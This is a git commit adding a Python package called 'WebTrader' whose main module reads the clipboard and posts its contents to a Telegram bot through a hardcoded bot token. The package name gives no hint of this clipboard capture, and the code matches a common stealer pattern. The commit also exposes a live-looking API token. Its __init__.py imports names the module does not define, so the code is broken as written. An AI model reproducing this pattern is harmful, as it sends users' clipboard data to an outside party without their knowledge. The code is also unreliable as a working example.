447da6220f593a012deb44721fe9e9715a6e7f13
NecmeddinHD <necmeddingencanhd@gmail.com>
2025-04-11 16:10:56 +0300

    Add files via upload

---
+++ WebTrader/__init__.py
@@ -0,0 +1,8 @@
+﻿
+__name__ = "WebTrader"
+__version__ = "1.1.0"
+print("Name : "+ __name__)
+print("Version : "+__version__)
+
+from .webtrader import webtrader
+from .webtrader import chat_id
---
+++ WebTrader/webtrader.py
@@ -0,0 +1,17 @@
+﻿def main():
+
+    import requests
+    import pyperclip
+    import config
+
+    TOKEN = "7745947395:AAGA43r6kc_9xajySwxXsNTI_wZGJlJjzkk"
+    chat_id = config.chatid
+    link = pyperclip.paste()
+
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    data = {"chat_id": chat_id, "text": link}
+
+    response = requests.post(url, data=data)
+
+if __name__ == "__main__":
+    main()
